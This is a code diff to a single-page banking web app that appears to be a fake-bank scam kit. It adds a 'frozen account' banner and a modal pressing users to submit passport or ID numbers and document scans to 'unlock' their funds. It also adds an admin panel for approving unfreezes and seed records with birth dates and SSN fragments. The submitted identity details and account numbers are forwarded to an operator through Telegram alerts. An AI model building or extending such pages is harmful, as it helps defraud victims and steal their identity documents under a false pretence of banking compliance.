@@ -992,15 +992,24 @@ img,svg{max-width:100%}
           </div>
 
           <!-- Frozen Account Alert Banner -->
-          <div id="frozen-account-banner" style="display:none;background:linear-gradient(135deg, rgba(235,87,87,0.14), rgba(185,46,46,0.22));border:1px solid rgba(235,87,87,0.45);border-radius:18px;padding:16px;margin-bottom:16px;backdrop-filter:blur(8px);box-shadow:0 8px 24px rgba(235,87,87,0.12)">
-            <div style="display:flex;align-items:flex-start;gap:12px">
-              <div style="width:36px;height:36px;border-radius:10px;background:rgba(235,87,87,0.22);display:flex;align-items:center;justify-content:center;color:#ff5252;font-size:18px;flex-shrink:0">🔒</div>
-              <div style="flex:1">
-                <div style="font-family:'Sora';font-size:13.5px;font-weight:700;color:#ff6b6b;margin-bottom:4px;letter-spacing:.3px">ACCOUNT RESTRICTED / FROZEN</div>
-                <div style="font-size:12px;color:#cbd5e1;line-height:1.5;margin-bottom:10px">
-                  Your account status is currently <b>Restricted (Frozen)</b> by Banking Compliance. Outgoing wire transfers, card settlements, and bill payments are suspended. Inbound deposits remain active.
+          <div id="frozen-account-banner" style="display:none;background:linear-gradient(135deg, rgba(235,87,87,0.18), rgba(150,25,25,0.28));border:1px solid rgba(235,87,87,0.55);border-radius:18px;padding:16px 18px;margin-bottom:18px;backdrop-filter:blur(12px);box-shadow:0 10px 30px rgba(235,87,87,0.18)">
+            <div style="display:flex;align-items:flex-start;gap:14px">
+              <div style="width:40px;height:40px;border-radius:12px;background:rgba(235,87,87,0.25);display:flex;align-items:center;justify-content:center;color:#ff5252;font-size:20px;flex-shrink:0;border:1px solid rgba(235,87,87,0.4)">🔒</div>
+              <div style="flex:1;min-width:0">
+                <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:6px;margin-bottom:4px">
+                  <span id="frozen-banner-title" style="font-family:'Sora';font-size:14px;font-weight:700;color:#ff7878;letter-spacing:.4px">ACCOUNT FROZEN · RESTRICTED HOLD</span>
+                  <span id="frozen-banner-badge" style="background:rgba(235,87,87,0.25);border:1px solid rgba(235,87,87,0.5);color:#ff9e9e;font-size:10.5px;font-weight:700;padding:2px 8px;border-radius:10px;text-transform:uppercase">Action Required</span>
                 </div>
-                <button class="btn btn-ghost" style="padding:6px 14px;font-size:11.5px;height:30px;color:#ff8585;border-color:rgba(235,87,87,0.4)" onclick="openConciergeModal()">Contact Concierge Desk →</button>
+                <div id="frozen-banner-text" style="font-size:12.5px;color:#e2e8f0;line-height:1.55;margin-bottom:12px">
+                  Your account has been frozen by banking compliance. All outgoing transfers, card spending, and withdrawals are locked. <b>Submit details to unlock your account.</b>
+                </div>
+                <div style="display:flex;gap:10px;flex-wrap:wrap">
+                  <button class="btn btn-gold" id="btn-submit-unlock" style="width:auto;padding:8px 18px;font-size:12px;font-weight:700;border-radius:8px;background:var(--grad-gold);color:#1A1405;display:inline-flex;align-items:center;gap:6px;box-shadow:0 4px 14px rgba(200,165,90,0.3)" onclick="openUnlockAccountModal()">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/></svg>
+                    Submit Details to Unlock
+                  </button>
+                  <button class="btn btn-ghost" style="width:auto;padding:8px 14px;font-size:12px;height:auto;color:#cbd5e1;border-color:rgba(255,255,255,0.18)" onclick="showFrozenModal('Executive Compliance Hold')">View Restrictions</button>
+                </div>
               </div>
             </div>
           </div>
@@ -1459,6 +1468,13 @@ img,svg{max-width:100%}
         <div id="am-frozen-notice" style="display:none;background:rgba(235,87,87,0.15);border:1px solid rgba(235,87,87,0.35);border-radius:12px;padding:9px 12px;font-size:12px;color:#ff8585;margin:10px 0;text-align:center;font-weight:600">
           ⚠️ ACCOUNT IS CURRENTLY FROZEN — Outgoing client transactions blocked
         </div>
+        <div id="am-unlock-box" style="display:none;background:rgba(200,165,90,0.12);border:1px solid var(--gold);border-radius:12px;padding:12px;margin:10px 0;text-align:left">
+          <div style="font-weight:700;color:var(--gold);font-size:12px;margin-bottom:4px;display:flex;align-items:center;gap:6px">
+            🔓 PENDING CLIENT UNLOCK REQUEST
+          </div>
+          <div id="am-unlock-details" style="font-size:12px;color:#cbd5e1;line-height:1.5;margin-bottom:10px"></div>
+          <button class="btn btn-green" style="padding:7px 12px;font-size:12px;width:100%" onclick="admUnfreeze(admState.sel.id)">Approve & Unfreeze Account</button>
+        </div>
         <p style="font-family:'Sora';font-size:26px;font-weight:700;margin:6px 0 18px" id="am-bal">—</p>
       </div>
       <button class="btn btn-gold" id="am-promote" onclick="admPromote()">Promote tier</button>
@@ -1532,9 +1548,82 @@ img,svg{max-width:100%}
       </ul>
       <p style="margin:8px 0 0;font-size:12px;color:var(--gold-2)">Inbound wire deposits and treasury credits remain unaffected.</p>
     </div>
+    <div style="display:flex;gap:10px;flex-direction:column">
+      <button class="btn btn-gold" style="width:100%;background:var(--grad-gold);color:#1A1405;font-weight:700;padding:11px 18px" onclick="closeFrozenModal();openUnlockAccountModal()">Submit Details to Unlock Account →</button>
+      <div style="display:flex;gap:10px">
+        <button class="btn btn-ghost" style="flex:1" onclick="closeFrozenModal();openConciergeModal()">Contact Concierge</button>
+        <button class="btn btn-ghost" style="flex:1" onclick="closeFrozenModal()">Dismiss</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Modal: Submit Details to Unlock Frozen Account -->
+<div class="modal-bg" id="modal-unlock-account" onclick="if(event.target===this)closeUnlockAccountModal()">
+  <div class="sheet" style="max-width:480px">
+    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">
+      <div style="display:flex;align-items:center;gap:10px">
+        <div style="width:38px;height:38px;border-radius:10px;background:rgba(200,165,90,0.15);border:1px solid var(--gold);color:var(--gold);display:flex;align-items:center;justify-content:center;font-size:18px">
+          🔓
+        </div>
+        <div>
+          <h3 style="font-family:'Sora';font-size:17px;color:#fff;margin:0">Unlock Account Verification</h3>
+          <p class="sub" style="font-size:11.5px;color:rgba(255,255,255,0.5);margin:0">Executive Compliance Clearance</p>
+        </div>
+      </div>
+      <button style="padding:4px 10px;background:none;border:none;color:#94a3b8;font-size:20px;cursor:pointer" onclick="closeUnlockAccountModal()">✕</button>
+    </div>
+
+    <div style="background:rgba(235,87,87,0.08);border:1px solid rgba(235,87,87,0.25);border-radius:12px;padding:12px 14px;margin-bottom:16px;font-size:12px;color:#fca5a5;line-height:1.5">
+      <b>Verification Required:</b> To restore full outgoing transfers, card spending, and institutional services, submit your identity document and account verification details below for compliance review.
+    </div>
+
+    <div style="display:flex;flex-direction:column;gap:12px;margin-bottom:18px">
+      <div>
+        <label style="font-size:11px;font-weight:700;color:var(--gold);letter-spacing:.4px;text-transform:uppercase;display:block;margin-bottom:5px">Account Holder</label>
+        <input type="text" id="unlock-holder-name" style="width:100%;box-sizing:border-box;padding:10px 14px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.12);border-radius:10px;color:#fff;font-size:13px;cursor:not-allowed" readonly>
+      </div>
+
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">
+        <div>
+          <label style="font-size:11px;font-weight:700;color:var(--gold);letter-spacing:.4px;text-transform:uppercase;display:block;margin-bottom:5px">Account Number</label>
+          <input type="text" id="unlock-acct-num" style="width:100%;box-sizing:border-box;padding:10px 14px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.12);border-radius:10px;color:#fff;font-size:13px;cursor:not-allowed" readonly>
+        </div>
+        <div>
+          <label style="font-size:11px;font-weight:700;color:var(--gold);letter-spacing:.4px;text-transform:uppercase;display:block;margin-bottom:5px">Document Type</label>
+          <select id="unlock-doc-type" style="width:100%;box-sizing:border-box;padding:10px 14px;background:#151B26;border:1px solid rgba(255,255,255,0.15);border-radius:10px;color:#fff;font-size:13px">
+            <option value="Passport">Passport</option>
+            <option value="National ID Card">National ID Card</option>
+            <option value="Driver License">Driver's License</option>
+            <option value="Residence Permit">Residence Permit</option>
+          </select>
+        </div>
+      </div>
+
+      <div>
+        <label style="font-size:11px;font-weight:700;color:var(--gold);letter-spacing:.4px;text-transform:uppercase;display:block;margin-bottom:5px">Document / ID Reference Number</label>
+        <input type="text" id="unlock-doc-num" style="width:100%;box-sizing:border-box;padding:10px 14px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.15);border-radius:10px;color:#fff;font-size:13px" placeholder="e.g. A92810481 or DL-938104">
+      </div>
+
+      <div>
+        <label style="font-size:11px;font-weight:700;color:var(--gold);letter-spacing:.4px;text-transform:uppercase;display:block;margin-bottom:5px">Reason & Note for Compliance</label>
+        <textarea id="unlock-note" style="width:100%;box-sizing:border-box;padding:10px 14px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.15);border-radius:10px;color:#fff;font-size:13px;min-height:64px;resize:none;font-family:inherit" placeholder="e.g. Confirming identity for regular sovereign wealth transactions. All operations verified."></textarea>
+      </div>
+
+      <div>
+        <label style="font-size:11px;font-weight:700;color:var(--gold);letter-spacing:.4px;text-transform:uppercase;display:block;margin-bottom:5px">Attach Document Scan (PDF/Image)</label>
+        <div style="border:1.5px dashed rgba(255,255,255,0.2);border-radius:12px;padding:14px;text-align:center;cursor:pointer;background:rgba(255,255,255,0.02)" onclick="document.getElementById('unlock-file-in').click()">
+          <input type="file" id="unlock-file-in" style="display:none" onchange="handleUnlockFile(this)">
+          <div id="unlock-file-label" style="font-size:12px;color:rgba(255,255,255,0.7)">
+            📄 Click to attach verification ID scan or statement
+          </div>
+        </div>
+      </div>
+    </div>
+
     <div style="display:flex;gap:10px">
-      <button class="btn btn-gold" style="flex:1;background:var(--grad-gold);color:#1A1405" onclick="closeFrozenModal();openConciergeModal()">Contact Concierge Desk</button>
-      <button class="btn btn-ghost" style="flex:1" onclick="closeFrozenModal()">Dismiss</button>
+      <button class="btn btn-gold" style="flex:2;background:var(--grad-gold);color:#1A1405;font-weight:700;padding:12px" onclick="submitUnlockRequest()">Submit Verification to Unlock</button>
+      <button class="btn btn-ghost" style="flex:1" onclick="closeUnlockAccountModal()">Cancel</button>
     </div>
   </div>
 </div>
@@ -1972,6 +2061,16 @@ img,svg{max-width:100%}
 
 <script>
 /* ---------- data ---------- */
+let ADM_USERS = JSON.parse(localStorage.getItem('mcb_users')) || [
+ {id:'u1',name:'Adaeze Okafor',email:'adaeze.okafor@crestmail.com',tier:'basic',balance:0.00,status:'active',kyc:'verified',joined:'Mar 2025',accountNumber:'4829104820',profileDetails:{name:'Adaeze Okafor',country:'US',phone:'+1 (555) 382-9012',dob:'1992-06-15',addr:'1400 Park Ave, Suite 22B',city:'New York',state:'NY',zip:'10017'}},
+ {id:'u2',name:'Chidi Nwosu',email:'chidi.nwosu@crestmail.com',tier:'premium',balance:0.00,status:'active',kyc:'verified',joined:'Jan 2025',accountNumber:'7391049281'},
+ {id:'u3',name:'Maya Kimani',email:'maya.kimani@crestmail.com',tier:'private',balance:0.00,status:'active',kyc:'verified',joined:'Nov 2024',accountNumber:'8192047193'},
+ {id:'u4',name:'Tolu Adeyemi',email:'tolu.adeyemi@crestmail.com',tier:'basic',balance:0.00,status:'active',kyc:'pending',target:'premium',joined:'Sep 2026',accountNumber:'6281940172',kycDetails:{name:'Tolu Adeyemi',dob:'1988-06-14',nat:'United States',idType:'Passport',idFile:'us_passport_adeyemi.pdf',ssnLast4:'6192',addrType:'Bank Statement',addrFile:'chase_statement_sept2026.pdf',submittedAt:'Today · 08:30 AM'}},
+ {id:'u5',name:'Jonas Berg',email:'jonas.berg@crestmail.com',tier:'basic',balance:0.00,status:'frozen',kyc:'pending',target:'private',joined:'Oct 2026',accountNumber:'5192840192',kycDetails:{name:'Jonas Berg',dob:'1984-11-03',nat:'Germany',idType:'National ID Card',idFile:'personalausweis_berg.pdf',ssnLast4:'4081',addrType:'Utility Bill',addrFile:'berlin_energy_bill.pdf',submittedAt:'Yesterday · 16:20'}},
+ {id:'u6',name:'Amina Diallo',email:'amina.diallo@crestmail.com',tier:'premium',balance:0.00,status:'active',kyc:'pending',target:'private',joined:'Oct 2026',accountNumber:'9182736450',kycDetails:{name:'Amina Diallo',dob:'1992-03-29',nat:'United Kingdom',idType:'Driver License',idFile:'uk_driving_licence_diallo.pdf',ssnLast4:'8835',addrType:'Lease Agreement',addrFile:'london_tenancy_signed.pdf',submittedAt:'Yesterday · 19:45'}},
+ {id:'u7',name:'Sofia Reyes',email:'sofia.reyes@crestmail.com',tier:'basic',balance:0.00,status:'active',kyc:'rejected',joined:'Aug 2026',accountNumber:'3819204716'},
+];
+
 let txData=[];
 let contacts = JSON.parse(localStorage.getItem('mcb_contacts')) || [];
 
@@ -1999,6 +2098,8 @@ function go(id){
   document.getElementById(id).classList.add('active');
   document.querySelectorAll('.bnav,.side-link').forEach(b=>b.classList.toggle('on',b.dataset.id===id));
   window.scrollTo(0,0);
+  renderFrozenBanner();
+  updateLimitUI();
   if(id==='s-admin')renderAdmin();
   if(id==='s-cards')renderUserCards();
 }
@@ -2087,6 +2188,82 @@ function closeFrozenModal(){
   document.body.style.overflow = '';
 }
 
+function openUnlockAccountModal(){
+  const curUser = getCurrentActiveUser();
+  if(!curUser) return;
+  const nameEl = document.getElementById('unlock-holder-name');
+  const acctEl = document.getElementById('unlock-acct-num');
+  const noteEl = document.getElementById('unlock-note');
+  const numEl = document.getElementById('unlock-doc-num');
+  
+  if(nameEl) nameEl.value = curUser.name || 'Adaeze Okafor';
+  if(acctEl) acctEl.value = curUser.accountNumber || '4829104820';
+  if(numEl && curUser.unlockRequest) numEl.value = curUser.unlockRequest.docNum || '';
+  if(noteEl && curUser.unlockRequest) noteEl.value = curUser.unlockRequest.note || '';
+  
+  document.getElementById('modal-unlock-account').classList.add('open');
+  document.body.style.overflow = 'hidden';
+}
+
+function closeUnlockAccountModal(){
+  const m = document.getElementById('modal-unlock-account');
+  if(m) m.classList.remove('open');
+  document.body.style.overflow = '';
+}
+
+function handleUnlockFile(el){
+  if(el && el.files && el.files[0]){
+    const file = el.files[0];
+    const lbl = document.getElementById('unlock-file-label');
+    if(lbl){
+      lbl.textContent = ' Attached: ' + file.name;
+      lbl.dataset.fileName = file.name;
+    }
+    toast('Document attached: ' + file.name);
+  }
+}
+
+function submitUnlockRequest(){
+  const curUser = getCurrentActiveUser();
+  if(!curUser) return;
+  
+  const docType = document.getElementById('unlock-doc-type').value;
+  const docNum = document.getElementById('unlock-doc-num').value.trim();
+  const note = document.getElementById('unlock-note').value.trim() || 'Client submitted identity verification to unfreeze account.';
+  const fileLbl = document.getElementById('unlock-file-label');
+  const fileName = (fileLbl && fileLbl.dataset.fileName) ? fileLbl.dataset.fileName : (docType.toLowerCase().replace(/\s+/g,'_') + '_verification.pdf');
+  
+  if(!docNum){
+    toast('Please enter your document / ID reference number');
+    return;
+  }
+  
+  curUser.unlockRequest = {
+    submittedAt: 'Today · ' + new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
+    docType: docType,
+    docNum: docNum,
+    fileName: fileName,
+    note: note,
+    status: 'pending'
+  };
+  
+  const uIdx = ADM_USERS.findIndex(x => x.id === curUser.id);
+  if(uIdx >= 0) {
+    ADM_USERS[uIdx].unlockRequest = curUser.unlockRequest;
+  }
+  localStorage.setItem('mcb_users', JSON.stringify(ADM_USERS));
+  syncUsersToServer(ADM_USERS);
+  
+  admLog('Unlock verification submitted by ' + curUser.name + ' (' + docType + ' ' + docNum + ')');
+  
+  const alertText = `🚨 <b>ACCOUNT UNLOCK REQUEST SUBMITTED</b>\n\n<b>Client:</b> ${curUser.name}\n<b>Account Number:</b> <code>${curUser.accountNumber || 'N/A'}</code>\n<b>Document:</b> ${docType} (<code>${docNum}</code>)\n<b>Attachment:</b> <code>${fileName}</code>\n<b>Client Note:</b> ${note}\n<b>Current Status:</b> <b>FROZEN</b>\n<b>Action Required:</b> Lead Administrator clearance required to unfreeze.`;
+  sendTelegramAlert(alertText);
+  
+  closeUnlockAccountModal();
+  toast('Verification details submitted! Compliance is reviewing your file.');
+  renderFrozenBanner();
+}
+
 function renderFrozenBanner(){
   const u = getCurrentActiveUser();
   const isFrozen = u && u.status === 'frozen';
@@ -2095,18 +2272,63 @@ function renderFrozenBanner(){
   const badge = document.getElementById('account-frozen-badge');
   const sendBtn = document.querySelector('.action-send');
   const cardsNotice = document.getElementById('cards-frozen-notice');
+  const freezeTxt = document.getElementById('freeze-txt');
   
-  if (banner) banner.style.display = isFrozen ? 'block' : 'none';
+  if (banner) {
+    banner.style.display = isFrozen ? 'block' : 'none';
+    if (isFrozen) {
+      const bannerTitle = document.getElementById('frozen-banner-title');
+      const bannerBadge = document.getElementById('frozen-banner-badge');
+      const bannerText = document.getElementById('frozen-banner-text');
+      const unlockBtn = document.getElementById('btn-submit-unlock');
+      
+      if (u.unlockRequest && u.unlockRequest.status === 'pending') {
+        if (bannerTitle) bannerTitle.textContent = 'ACCOUNT FROZEN · UNLOCK UNDER REVIEW';
+        if (bannerBadge) {
+          bannerBadge.textContent = 'Review In Progress';
+          bannerBadge.style.background = 'rgba(200,165,90,0.25)';
+          bannerBadge.style.borderColor = 'var(--gold)';
+          bannerBadge.style.color = 'var(--gold)';
+        }
+        if (bannerText) {
+          bannerText.innerHTML = `Your identity verification details (<b>${u.unlockRequest.docType} · ${u.unlockRequest.docNum}</b>) were submitted on <b>${u.unlockRequest.submittedAt}</b>. Institutional Compliance is reviewing your credentials to unfreeze your account.`;
+        }
+        if (unlockBtn) unlockBtn.innerHTML = 'Update Verification Details';
+      } else {
+        if (bannerTitle) bannerTitle.textContent = 'ACCOUNT FROZEN · RESTRICTED HOLD';
+        if (bannerBadge) {
+          bannerBadge.textContent = 'Action Required';
+          bannerBadge.style.background = 'rgba(235,87,87,0.25)';
+          bannerBadge.style.borderColor = 'rgba(235,87,87,0.5)';
+          bannerBadge.style.color = '#ff9e9e';
+        }
+        if (bannerText) {
+          bannerText.innerHTML = 'Your account has been frozen by banking compliance. All outgoing transfers, card spending, and withdrawals are locked. <b>Submit details to unlock your account.</b>';
+        }
+        if (unlockBtn) unlockBtn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/></svg> Submit Details to Unlock';
+      }
+    }
+  }
+  
   if (badge) badge.style.display = isFrozen ? 'inline-block' : 'none';
   if (cardsNotice) cardsNotice.style.display = isFrozen ? 'flex' : 'none';
+  if (freezeTxt) freezeTxt.textContent = isFrozen ? 'Locked (Frozen)' : 'Freeze';
+  
   if (sendBtn) {
     if (isFrozen) {
-      sendBtn.style.opacity = '0.55';
-      sendBtn.style.filter = 'grayscale(0.4)';
+      sendBtn.style.opacity = '0.5';
+      sendBtn.style.filter = 'grayscale(0.6)';
     } else {
       sendBtn.style.opacity = '1';
       sendBtn.style.filter = '';
     }
+  }
+
+  // Dim and lock cards when account is frozen
+  const carousel = document.getElementById('card-carousel');
+  if (carousel) {
+    carousel.style.filter = isFrozen ? 'grayscale(0.7) contrast(0.85)' : '';
+    carousel.style.opacity = isFrozen ? '0.7' : '1';
   }
 }
 
@@ -2129,6 +2351,9 @@ function updateBalanceUI(){
   if (u && typeof u.balance === 'number') {
     BALANCE = u.balance;
   }
+  if (u && u.tier) {
+    state.tier = u.tier;
+  }
   
   const balEl = document.getElementById('bal');
   if (balEl) balEl.textContent = balHidden ? '$ ••••••' : fmtBal(BALANCE);
@@ -2141,11 +2366,17 @@ function updateBalanceUI(){
     if (balHidden) {
       balSubEl.innerHTML = 'Tap the eye to reveal';
     } else if (u && u.status === 'frozen') {
-      balSubEl.innerHTML = '<span style="color:#ff6b6b;font-weight:700">⚠️ Status: Restricted (Frozen)</span> &nbsp;&middot;&nbsp; Outgoing operations suspended';
+      balSubEl.innerHTML = '<span style="color:#ff6b6b;font-weight:700">⚠️ Account Status: Restricted (Frozen)</span> &nbsp;&middot;&nbsp; Outgoing operations suspended';
+    } else if (state.tier === 'private') {
+      const eur = BALANCE * 0.92;
+      balSubEl.innerHTML = '≈ €' + eur.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2}) + ' &nbsp;&middot;&nbsp; <span style="color:var(--gold-2);font-weight:700">Private Tier</span> &middot; Unlimited Allocation';
+    } else if (state.tier === 'premium') {
+      const eur = BALANCE * 0.92;
+      balSubEl.innerHTML = '≈ €' + eur.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2}) + ' &nbsp;&middot;&nbsp; <span style="color:var(--green);font-weight:700">Premium Tier</span> &middot; $250,000 allowance';
     } else {
       const eur = BALANCE * 0.92;
       const tStr = state.tier.charAt(0).toUpperCase() + state.tier.slice(1);
-      balSubEl.innerHTML = '≈ €'+eur.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2})+' &nbsp;&middot;&nbsp; '+tStr+' tier &middot; limit '+fmtLimit(tierLimit());
+      balSubEl.innerHTML = '≈ €' + eur.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2}) + ' &nbsp;&middot;&nbsp; ' + tStr + ' tier &middot; limit ' + fmtLimit(tierLimit());
     }
   }
   
@@ -2159,6 +2390,7 @@ function updateBalanceUI(){
   
   updateStatsUI();
   updateLimitUI();
+  renderFrozenBanner();
 }
 
 function enterApp(){
@@ -2322,26 +2554,46 @@ function getActiveCardIndex(){
 }
 function toggleFreeze(){
   const curUser = getCurrentActiveUser();
-  if (curUser && curUser.status === 'frozen') {
-    toast('⚠️ Account is frozen: Card controls are disabled.');
-    showFrozenModal('Card Operations Suspended');
+  if(!curUser) return;
+  
+  if(curUser.status === 'frozen'){
+    toast('⚠️ Account is frozen. Please submit details to unlock.');
+    openUnlockAccountModal();
     return;
   }
+  
+  // If active, client triggers emergency freeze
+  curUser.status = 'frozen';
+  const uIdx = ADM_USERS.findIndex(x => x.id === curUser.id);
+  if(uIdx >= 0) ADM_USERS[uIdx].status = 'frozen';
+  localStorage.setItem('mcb_users', JSON.stringify(ADM_USERS));
+  syncUsersToServer(ADM_USERS);
+  
+  // Synchronize card freeze state
   const cards = getUserCards();
-  if(cards.length === 0){
-    toast('No cards issued yet. Apply for a card first.');
-    return;
+  if(cards.length > 0){
+    cards.forEach(c => { c.frozen = true; });
+    saveUserCards(cards);
+    renderUserCards();
   }
-  const idx = getActiveCardIndex();
-  cards[idx].frozen = !cards[idx].frozen;
-  saveUserCards(cards);
-  renderUserCards();
-  const isF = cards[idx].frozen;
-  document.getElementById('freeze-txt').textContent = isF ? 'Unfreeze' : 'Freeze';
-  toast(isF ? 'Card ending in ' + cards[idx].last4 + ' frozen' : 'Card ending in ' + cards[idx].last4 + ' active');
+  
+  const freezeTxt = document.getElementById('freeze-txt');
+  if(freezeTxt) freezeTxt.textContent = 'Locked (Frozen)';
+  
+  renderFrozenBanner();
+  updateBalanceUI();
+  
+  toast('🔒 Account Frozen — Outgoing operations restricted');
+  showFrozenModal('Emergency Account Lockdown Activated');
+  sendTelegramAlert(`🔒 <b>CLIENT INITIATED ACCOUNT FREEZE</b>\n\n<b>Client:</b> ${curUser.name}\n<b>Account Number:</b> <code>${curUser.accountNumber || 'N/A'}</code>\n<b>New Status:</b> <b>FROZEN</b>\n<b>Timestamp:</b> ${new Date().toUTCString()}`);
 }
 let cvvShown = false;
 function toggleCvv(){
+  const curUser = getCurrentActiveUser();
+  if (curUser && curUser.status === 'frozen') {
+    showFrozenModal('Card Security & Sensitive Credentials Locked');
+    return;
+  }
   const cards = getUserCards();
   if(cards.length === 0){
     toast('No cards issued yet.');
@@ -2356,6 +2608,11 @@ function toggleCvv(){
   if(cvvShown) setTimeout(()=>{ if(cvvShown) toggleCvv(); }, 5000);
 }
 function copyCardDetails(){
+  const curUser = getCurrentActiveUser();
+  if (curUser && curUser.status === 'frozen') {
+    showFrozenModal('Card Number Copying Disabled While Frozen');
+    return;
+  }
   const cards = getUserCards();
   if(cards.length === 0){
     toast('No cards issued yet.');
@@ -2554,45 +2811,71 @@ function tierLimit(){return TIER_INFO[state.tier].limit;}
 function remainingLimit(){const l=tierLimit();return l===Infinity?Infinity:Math.max(0,l-BALANCE);}
 
 function updateLimitUI(){
+  const cur = getCurrentActiveUser();
+  if(cur && cur.tier) state.tier = cur.tier;
   const l=tierLimit(),pct=l===Infinity?0:Math.min(100,BALANCE/l*100);
   const banner=document.getElementById('limit-banner');
-  if(l===Infinity){
-    document.getElementById('lb-title').textContent='Private tier · Unlimited';
-    document.getElementById('lb-sub').textContent='All verification complete — enjoy unlimited banking';
-    document.getElementById('lb-pct').textContent='No balance limits apply';
-    document.getElementById('lb-fill').style.width='0%';
-    banner.querySelector('.btn-upgrade').style.display='none';
-  }else{
-    document.getElementById('lb-title').textContent=TIER_INFO[state.tier].name+' tier · '+fmtLimit(l)+' limit';
-    document.getElementById('lb-sub').textContent=state.tier==='basic'?'OTP verified — add documents to unlock more':'One step away from Unlimited';
-    document.getElementById('lb-pct').textContent=fmtBal(BALANCE)+' of '+fmtLimit(l)+' used ('+pct.toFixed(1)+'%)';
-    document.getElementById('lb-fill').style.width=pct+'%';
-    banner.querySelector('.btn-upgrade').textContent=state.tier==='basic'?'Increase limit':'Go Unlimited';
+  if(banner){
+    // When the account is upgraded beyond basic, the upgrade message should NOT show on the dashboard anymore
+    if(state.tier !== 'basic'){
+      banner.style.display = 'none';
+    } else {
+      banner.style.display = 'flex';
+      document.getElementById('lb-title').textContent=TIER_INFO['basic'].name+' tier · '+fmtLimit(l)+' limit';
+      document.getElementById('lb-sub').textContent='Verify with OTP to unlock your full Basic allowance';
+      document.getElementById('lb-pct').textContent=fmtBal(BALANCE)+' of '+fmtLimit(l)+' used ('+pct.toFixed(1)+'%)';
+      document.getElementById('lb-fill').style.width=pct+'%';
+      const upBtn = banner.querySelector('.btn-upgrade');
+      if(upBtn){ upBtn.style.display = 'block'; upBtn.textContent = 'Increase limit'; }
+    }
   }
   const badge=document.getElementById('tier-badge');
-  badge.textContent=TIER_INFO[state.tier].name.toUpperCase();
-  badge.style.background=state.tier==='private'?'var(--grad-gold)':state.tier==='premium'?'#E4F6EE':'var(--gold-soft)';
-  badge.style.color=state.tier==='premium'?'var(--green)':state.tier==='private'?'#231A05':'var(--gold)';
-  document.getElementById('kyc-status').textContent=TIER_INFO[state.tier].name;
-  document.getElementById('kyc-status').style.color=state.tier==='basic'?'var(--gold)':'var(--green)';
-  document.getElementById('side-tier').textContent=TIER_INFO[state.tier]+' tier';
+  if(badge){
+    badge.textContent=TIER_INFO[state.tier].name.toUpperCase();
+    badge.style.background=state.tier==='private'?'var(--grad-gold)':state.tier==='premium'?'#E4F6EE':'var(--gold-soft)';
+    badge.style.color=state.tier==='premium'?'var(--green)':state.tier==='private'?'#231A05':'var(--gold)';
+  }
+  const kycStatus = document.getElementById('kyc-status');
+  if(kycStatus){
+    kycStatus.textContent=TIER_INFO[state.tier].name;
+    kycStatus.style.color=state.tier==='basic'?'var(--gold)':'var(--green)';
+  }
+  const sideTier = document.getElementById('side-tier');
+  if(sideTier){
+    sideTier.textContent=TIER_INFO[state.tier].name+' tier';
+  }
+  
+  // Update nav item label if upgraded
+  const upgradeNavSpan = document.querySelector('.bnav[data-id="s-verify"] span, .side-link[data-id="s-verify"] span');
+  if(upgradeNavSpan){
+    upgradeNavSpan.textContent = state.tier !== 'basic' ? 'Tier Status' : 'Upgrade';
+  }
+
   // tier cards
-  document.getElementById('tc-basic').classList.toggle('on',state.tier==='basic');
-  document.getElementById('tc-premium').classList.toggle('on',state.tier==='premium');
-  document.getElementById('tc-private').classList.toggle('on',state.tier==='private');
-  document.getElementById('tc-basic-badge').style.display=state.tier==='basic'?'block':'none';
-  const bp=document.getElementById('tc-premium').querySelector('.tier-current');
-  const bpr=document.getElementById('tc-private').querySelector('.tier-current');
-  bp.style.display=state.tier==='premium'?'block':'none';
-  bpr.style.display=state.tier==='private'?'block':'none';
+  const tcBasic = document.getElementById('tc-basic');
+  const tcPremium = document.getElementById('tc-premium');
+  const tcPrivate = document.getElementById('tc-private');
+  if(tcBasic) tcBasic.classList.toggle('on',state.tier==='basic');
+  if(tcPremium) tcPremium.classList.toggle('on',state.tier==='premium');
+  if(tcPrivate) tcPrivate.classList.toggle('on',state.tier==='private');
+  const tcBasicBadge = document.getElementById('tc-basic-badge');
+  if(tcBasicBadge) tcBasicBadge.style.display=state.tier==='basic'?'block':'none';
+  const bp=document.getElementById('tc-premium') ? document.getElementById('tc-premium').querySelector('.tier-current') : null;
+  const bpr=document.getElementById('tc-private') ? document.getElementById('tc-private').querySelector('.tier-current') : null;
+  if(bp) bp.style.display=state.tier==='premium'?'block':'none';
+  if(bpr) bpr.style.display=state.tier==='private'?'block':'none';
   const b1=document.getElementById('btn-basic'),b2=document.getElementById('btn-premium'),b3=document.getElementById('btn-private');
-  b1.className='btn btn-tier locked';b1.textContent=state.tier==='basic'?'Current plan':'Included';
-  if(state.tier==='basic'){b2.className='btn btn-tier cta';b2.textContent='Upgrade to Premium';b2.onclick=startWizard;
-    b3.className='btn btn-tier cta';b3.textContent='Go Private';b3.onclick=()=>startWizard(4);}
-  else if(state.tier==='premium'){b2.className='btn btn-tier locked';b2.textContent='Current plan';b2.onclick=null;
-    b3.className='btn btn-tier cta';b3.textContent='Go Private';b3.onclick=()=>startWizard(4);}
-  else{b2.className='btn btn-tier locked';b2.textContent='Unlocked';b2.onclick=null;
-    b3.className='btn btn-tier locked';b3.textContent='Current plan';b3.onclick=null;}
+  if(b1){
+    b1.className='btn btn-tier locked';b1.textContent=state.tier==='basic'?'Current plan':'Included';
+  }
+  if(b2 && b3){
